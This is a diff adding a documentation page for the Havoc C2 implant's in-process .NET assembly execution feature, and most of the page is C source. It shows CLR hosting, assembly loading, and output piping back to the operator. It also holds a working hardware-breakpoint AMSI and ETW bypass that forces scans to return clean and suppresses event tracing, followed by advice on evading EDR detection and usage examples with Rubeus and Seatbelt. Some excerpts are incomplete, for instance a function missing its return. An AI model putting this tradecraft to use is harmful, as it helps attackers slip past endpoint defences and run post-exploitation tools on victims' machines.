@@ -1,0 +1,508 @@
+---
+title: '.NET Assembly Execution'
+description: 'In-process .NET assembly execution with CLR hosting and AMSI bypass'
+icon: 'code'
+---
+
+## Overview
+
+Havoc can execute .NET assemblies directly within the agent process using the Common Language Runtime (CLR) hosting APIs. This technique, known as "execute-assembly" or "inline-execute", avoids spawning new processes and enables stealth execution of .NET tooling.
+
+<Info>
+  Inline assembly execution uses the unmanaged CLR hosting interfaces to bootstrap .NET code within the implant's process, with optional AMSI and ETW bypasses.
+</Info>
+
+## CLR Hosting Architecture
+
+### Initialization
+
+Havoc uses `mscoree.dll` to bootstrap the CLR:
+
+**Source**: `payloads/Demon/src/core/Dotnet.c:524`
+
+```c
+DWORD ClrCreateInstance(
+    LPCWSTR dotNetVersion,
+    PICLRMetaHost *ppClrMetaHost,
+    PICLRRuntimeInfo *ppClrRuntimeInfo,
+    ICorRuntimeHost **ppICorRuntimeHost
+) {
+    BOOL fLoadable = FALSE;
+    
+    if (RtMscoree()) {
+        // Create CLR MetaHost
+        if (Instance->Win32.CLRCreateInstance(
+            &xCLSID_CLRMetaHost,
+            &xIID_ICLRMetaHost,
+            (LPVOID*)ppClrMetaHost
+        ) == S_OK) {
+            
+            // Get specific runtime version
+            (*ppClrMetaHost)->lpVtbl->GetRuntime(
+                *ppClrMetaHost,
+                dotNetVersion,  // e.g., L"v4.0.30319"
+                &xIID_ICLRRuntimeInfo,
+                (LPVOID*)ppClrRuntimeInfo
+            );
+            
+            // Check if loadable
+            (*ppClrRuntimeInfo)->lpVtbl->IsLoadable(
+                *ppClrRuntimeInfo, &fLoadable
+            );
+            
+            if (fLoadable) {
+                // Get ICorRuntimeHost interface
+                (*ppClrRuntimeInfo)->lpVtbl->GetInterface(
+                    *ppClrRuntimeInfo,
+                    &xCLSID_CorRuntimeHost,
+                    &xIID_ICorRuntimeHost,
+                    (LPVOID*)ppICorRuntimeHost
+                );
+                
+                // Start the CLR
+                (*ppICorRuntimeHost)->lpVtbl->Start(*ppICorRuntimeHost);
+            }
+        }
+    }
+}
+```
+
+### CLR GUIDs
+
+**Source**: `payloads/Demon/src/core/Dotnet.c:10`
+
+```c
+GUID xCLSID_CLRMetaHost    = {0x9280188d, 0xe8e,  0x4867, 
+                               {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};
+GUID xCLSID_CorRuntimeHost = {0xcb2f6723, 0xab3a, 0x11d2, 
+                               {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};
+GUID xIID_AppDomain        = {0x05F696DC, 0x2B29, 0x3663, 
+                               {0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13}};
+GUID xIID_ICLRMetaHost     = {0xD332DB9E, 0xB9B3, 0x4125, 
+                               {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
+GUID xIID_ICLRRuntimeInfo  = {0xBD39D1D2, 0xBA2F, 0x486a, 
+                               {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};
+GUID xIID_ICorRuntimeHost  = {0xcb2f6722, 0xab3a, 0x11d2, 
+                               {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};
+```
+
+## Assembly Loading & Execution
+
+**Source**: `payloads/Demon/src/core/Dotnet.c:19`
+
+```c
+BOOL DotnetExecute(BUFFER Assembly, BUFFER Arguments) {
+    SAFEARRAYBOUND RgsBound[1] = {0};
+    LPWSTR* ArgumentsArray = NULL;
+    INT ArgumentsCount = 0;
+    VARIANT Object = {0};
+    
+    // Create named pipe for output redirection
+    Instance->Dotnet->Pipe = Instance->Win32.CreateNamedPipeW(
+        Instance->Dotnet->PipeName.Buffer,
+        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
+        PIPE_TYPE_MESSAGE,
+        PIPE_UNLIMITED_INSTANCES,
+        PIPE_BUFFER, PIPE_BUFFER,
+        0, NULL
+    );
+    
+    // Create file handle to write side of pipe
+    Instance->Dotnet->File = Instance->Win32.CreateFileW(
+        Instance->Dotnet->PipeName.Buffer,
+        GENERIC_WRITE,
+        FILE_SHARE_READ,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+    
+    // Host the CLR
+    if (!ClrCreateInstance(
+        Instance->Dotnet->NetVersion.Buffer,
+        &Instance->Dotnet->MetaHost,
+        &Instance->Dotnet->ClrRuntimeInfo,
+        &Instance->Dotnet->ICorRuntimeHost
+    )) {
+        return FALSE;
+    }
+    
+    // Create SafeArray to hold assembly bytes
+    RgsBound[0].cElements = Assembly.Length;
+    RgsBound[0].lLbound   = 0;
+    Instance->Dotnet->SafeArray = Instance->Win32.SafeArrayCreate(
+        VT_UI1, 1, RgsBound
+    );
+    
+    // Create AppDomain
+    Instance->Dotnet->ICorRuntimeHost->lpVtbl->CreateDomain(
+        Instance->Dotnet->ICorRuntimeHost,
+        Instance->Dotnet->AppDomainName.Buffer,
+        NULL,
+        &Instance->Dotnet->AppDomainThunk
+    );
+    
+    // Get AppDomain interface
+    Instance->Dotnet->AppDomainThunk->lpVtbl->QueryInterface(
+        Instance->Dotnet->AppDomainThunk,
+        &xIID_AppDomain,
+        (LPVOID*)&Instance->Dotnet->AppDomain
+    );
+    
+    // Copy assembly bytes into SafeArray
+    Instance->Win32.SafeArrayAccessData(
+        Instance->Dotnet->SafeArray, &AssemblyData.Buffer
+    );
+    MemCopy(AssemblyData.Buffer, Assembly.Buffer, Assembly.Length);
+    Instance->Win32.SafeArrayUnaccessData(Instance->Dotnet->SafeArray);
+    
+    // Load assembly into AppDomain
+    Instance->Dotnet->AppDomain->lpVtbl->Load_3(
+        Instance->Dotnet->AppDomain,
+        Instance->Dotnet->SafeArray,
+        &Instance->Dotnet->Assembly
+    );
+    
+    // Get EntryPoint method
+    Instance->Dotnet->Assembly->lpVtbl->EntryPoint(
+        Instance->Dotnet->Assembly,
+        &Instance->Dotnet->MethodInfo
+    );
+    
+    // Prepare arguments
+    Instance->Dotnet->MethodArgs = Instance->Win32.SafeArrayCreateVector(
+        VT_VARIANT, 0, 1
+    );
+    
+    ArgumentsArray = Instance->Win32.CommandLineToArgvW(
+        Arguments.Buffer, &ArgumentsCount
+    );
+    ArgumentsArray++;  // Skip executable name
+    ArgumentsCount--;
+    
+    Instance->Dotnet->vtPsa.vt = (VT_ARRAY | VT_BSTR);
+    Instance->Dotnet->vtPsa.parray = Instance->Win32.SafeArrayCreateVector(
+        VT_BSTR, 0, ArgumentsCount
+    );
+    
+    for (LONG i = 0; i < ArgumentsCount; i++) {
+        Instance->Win32.SafeArrayPutElement(
+            Instance->Dotnet->vtPsa.parray,
+            &i,
+            Instance->Win32.SysAllocString(ArgumentsArray[i])
+        );
+    }
+    
+    // Redirect stdout to pipe
+    Instance->Dotnet->StdOut = Instance->Win32.GetStdHandle(STD_OUTPUT_HANDLE);
+    Instance->Win32.SetStdHandle(STD_OUTPUT_HANDLE, Instance->Dotnet->File);
+    
+    // Invoke the assembly entry point
+    Instance->Dotnet->MethodInfo->lpVtbl->Invoke_3(
+        Instance->Dotnet->MethodInfo,
+        Object,
+        Instance->Dotnet->MethodArgs,
+        &Instance->Dotnet->Return
+    );
+    
+    Instance->Dotnet->Invoked = TRUE;
+    
+    // Capture and send output
+    DotnetPush();
+    
+    return TRUE;
+}
+```
+
+## AMSI Bypass
+
+Havoc implements hardware breakpoint-based AMSI/ETW bypass:
+
+**Source**: `payloads/Demon/src/core/Dotnet.c:86`
+
+```c
+if (Instance->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP) {
+    // Initialize hardware breakpoint engine
+    if (!NT_SUCCESS(HwBpEngineInit(NULL, NULL))) {
+        return FALSE;
+    }
+    
+    ThreadId = U_PTR(Instance->Teb->ClientId.UniqueThread);
+    
+    // Add AMSI bypass if loaded
+    if (AmsiIsLoaded) {
+        if (!NT_SUCCESS(HwBpEngineAdd(
+            NULL,
+            ThreadId,
+            Instance->Win32.AmsiScanBuffer,  // Function to hook
+            HwBpExAmsiScanBuffer,            // Exception handler
+            0                                 // Debug register index
+        ))) {
+            return FALSE;
+        }
+    }
+    
+    // Add ETW bypass
+    if (!NT_SUCCESS(HwBpEngineAdd(
+        NULL,
+        ThreadId,
+        Instance->Win32.NtTraceEvent,  // Function to hook
+        HwBpExNtTraceEvent,            // Exception handler
+        1                               // Debug register index
+    ))) {
+        return FALSE;
+    }
+}
+```
+
+### Hardware Breakpoint Exception Handlers
+
+**Source**: `payloads/Demon/src/core/HwBpExceptions.c:6`
+
+```c
+VOID HwBpExAmsiScanBuffer(_Inout_ PEXCEPTION_POINTERS Exception) {
+    PVOID Return = NULL;
+    
+    // Set AmsiResult parameter to 0 (AMSI_RESULT_CLEAN)
+    EXCEPTION_ARG_5(Exception) = 0;
+    
+    // Set return value to E_INVALIDARG
+    EXCEPTION_SET_RET(Exception, 0x80070057);
+    
+    // Skip function execution and return
+    Return = EXCEPTION_GET_RET(Exception);
+    EXCEPTION_ADJ_STACK(Exception, sizeof(PVOID));
+    EXCEPTION_SET_RIP(Exception, U_PTR(Return));
+}
+
+VOID HwBpExNtTraceEvent(_Inout_ PEXCEPTION_POINTERS Exception) {
+    PVOID Return = NULL;
+    
+    // Skip ETW event tracing
+    Return = EXCEPTION_GET_RET(Exception);
+    EXCEPTION_ADJ_STACK(Exception, sizeof(PVOID));
+    EXCEPTION_SET_RIP(Exception, U_PTR(Return));
+}
+```
+
+<Info>
+  Hardware breakpoints (DR0-DR3) trigger exceptions before function execution. Havoc's exception handlers modify registers to skip AMSI/ETW calls entirely.
+</Info>
+
+## Output Redirection
+
+### Named Pipe Capture
+
+**Source**: `payloads/Demon/src/core/Dotnet.c:312`
+
+```c
+VOID DotnetPushPipe() {
+    DWORD Read = 0;
+    DWORD BytesRead = 0;
+    
+    if (!Instance->Dotnet)
+        return;
+    
+    // Check how much data is in the pipe
+    if (Instance->Win32.PeekNamedPipe(
+        Instance->Dotnet->Pipe, NULL, 0, NULL, &Read, NULL
+    )) {
+        if (Read > 0) {
+            Instance->Dotnet->Output.Length = Read;
+            Instance->Dotnet->Output.Buffer = MmHeapAlloc(
+                Instance->Dotnet->Output.Length
+            );
+            
+            // Read from pipe
+            Instance->Win32.ReadFile(
+                Instance->Dotnet->Pipe,
+                Instance->Dotnet->Output.Buffer,
+                Instance->Dotnet->Output.Length,
+                &BytesRead,
+                NULL
+            );
+            
+            Instance->Dotnet->Output.Length = BytesRead;
+            
+            // Send output to operator
+            PPACKAGE Package = PackageCreateWithRequestID(
+                DEMON_OUTPUT,
+                Instance->Dotnet->RequestID
+            );
+            PackageAddBytes(
+                Package,
+                Instance->Dotnet->Output.Buffer,
+                Instance->Dotnet->Output.Length
+            );
+            PackageTransmit(Package);
+            
+            // Clean up
+            MemSet(Instance->Dotnet->Output.Buffer, 0, Read);
+            MmHeapFree(Instance->Dotnet->Output.Buffer);
+            Instance->Dotnet->Output.Buffer = NULL;
+        }
+    }
+}
+```
+
+## Cleanup & Unloading
+
+**Source**: `payloads/Demon/src/core/Dotnet.c:379`
+
+```c
+VOID DotnetClose() {
+    // Free console if allocated
+    Instance->Win32.FreeConsole();
+    
+    // Destroy hardware breakpoint engine
+    if (Instance->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP) {
+        HwBpEngineDestroy(NULL);
+    }
+    
+    // Close handles
+    if (Instance->Dotnet->Event) {
+        SysNtClose(Instance->Dotnet->Event);
+    }
+    if (Instance->Dotnet->Pipe) {
+        SysNtClose(Instance->Dotnet->Pipe);
+    }
+    if (Instance->Dotnet->File) {
+        SysNtClose(Instance->Dotnet->File);
+    }
+    
+    // Release COM interfaces
+    if (Instance->Dotnet->MethodArgs) {
+        Instance->Win32.SafeArrayDestroy(Instance->Dotnet->MethodArgs);
+    }
+    if (Instance->Dotnet->MethodInfo) {
+        Instance->Dotnet->MethodInfo->lpVtbl->Release(
+            Instance->Dotnet->MethodInfo
+        );
+    }
+    if (Instance->Dotnet->Assembly) {
+        Instance->Dotnet->Assembly->lpVtbl->Release(
+            Instance->Dotnet->Assembly
+        );
+    }
+    if (Instance->Dotnet->AppDomain) {
+        Instance->Dotnet->AppDomain->lpVtbl->Release(
+            Instance->Dotnet->AppDomain
+        );
+    }
+    if (Instance->Dotnet->AppDomainThunk) {
+        Instance->Dotnet->AppDomainThunk->lpVtbl->Release(
+            Instance->Dotnet->AppDomainThunk
+        );
+    }
+    
+    // Stop and release CLR
+    if (Instance->Dotnet->ICorRuntimeHost) {
+        Instance->Dotnet->ICorRuntimeHost->lpVtbl->UnloadDomain(
+            Instance->Dotnet->ICorRuntimeHost,
+            Instance->Dotnet->AppDomainThunk
+        );
+        Instance->Dotnet->ICorRuntimeHost->lpVtbl->Stop(
+            Instance->Dotnet->ICorRuntimeHost
+        );
+    }
+    if (Instance->Dotnet->ClrRuntimeInfo) {
+        Instance->Dotnet->ClrRuntimeInfo->lpVtbl->Release(
+            Instance->Dotnet->ClrRuntimeInfo
+        );
+    }
+    if (Instance->Dotnet->MetaHost) {
+        Instance->Dotnet->MetaHost->lpVtbl->Release(
+            Instance->Dotnet->MetaHost
+        );
+    }
+    
+    // Free Dotnet structure
+    if (Instance->Dotnet) {
+        MemSet(Instance->Dotnet, 0, sizeof(DOTNET_ARGS));
+        MmHeapFree(Instance->Dotnet);
+        Instance->Dotnet = NULL;
+    }
+}
+```
+
+<Warning>
+  CLR hosting can leave .NET assemblies and AppDomains loaded in memory. While Havoc attempts to unload AppDomains, the CLR itself remains loaded in the process.
+</Warning>
+
+## .NET Version Detection
+
+**Source**: `payloads/Demon/src/core/Dotnet.c:501`
+
+```c
+BOOL FindVersion(PVOID Assembly, DWORD length) {
+    char* assembly_c = (char*)Assembly;
+    char v4[] = {0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39}; // "v4.0.30319"
+    
+    for (int i = 0; i < length; i++) {
+        for (int j = 0; j < 10; j++) {
+            if (v4[j] != assembly_c[i + j])
+                break;
+            else {
+                if (j == 9)
+                    return 1;  // v4 detected
+            }
+        }
+    }
+    
+    return 0;  // Not v4
+}
+```
+
+## OPSEC Considerations
+
+<Accordion title="Detection Risks">
+1. **CLR Loaded in Unusual Process**: EDRs detect CLR in non-.NET processes
+2. **AppDomain Creation**: `RuntimeBroker` or CLR ETW events
+3. **Assembly Loading**: Image load events for `mscoree.dll`, `clr.dll`, `mscorlib.dll`
+4. **Hardware Breakpoints**: DR0-DR3 registers set (detectable via `GetThreadContext`)
+5. **Named Pipes**: Pipe creation for output redirection
+6. **Console Allocation**: `AllocConsole` from non-console process
+7. **Memory Patterns**: .NET assemblies visible in process memory
+</Accordion>
+
+### Mitigation Strategies
+
+1. **Limit Use**: Only execute assemblies when necessary
+2. **Target Legitimate Processes**: Use process injection into existing .NET processes
+3. **Clean Memory**: Ensure proper cleanup after execution
+4. **Avoid Common Tools**: Don't run Rubeus, SharpHound, etc. repeatedly
+
+## Usage Examples
+
+```
+# Execute Seatbelt with arguments
+inline-execute /path/to/Seatbelt.exe -group=system
+
+# Execute Rubeus
+inline-execute /path/to/Rubeus.exe triage
+
+# Execute custom assembly
+inline-execute /path/to/custom.exe arg1 arg2 arg3
+```
+
+## Limitations
+
+1. **Single CLR Version**: Only one CLR version can be loaded per process
+2. **AppDomain Isolation**: Limited isolation between successive assembly executions
+3. **Memory Footprint**: CLR significantly increases process memory
+4. **No Unloading**: CLR cannot be fully unloaded once initialized
+5. **x64 Only**: Hardware breakpoint bypass only works on x64
+
+## Related Techniques
+
+- [Indirect Syscalls](/advanced/indirect-syscalls) - Used for memory operations
+- [COFF Loader](/advanced/coff-loader) - Alternative to .NET assemblies
+- Process injection for assembly execution in remote processes
+
+## References
+
+- CLR hosting: `payloads/Demon/src/core/Dotnet.c`
+- AMSI bypass: `payloads/Demon/src/core/HwBpExceptions.c`
+- Hardware breakpoints: `payloads/Demon/src/core/HwBpEngine.c`
+- Microsoft CLR Hosting documentation
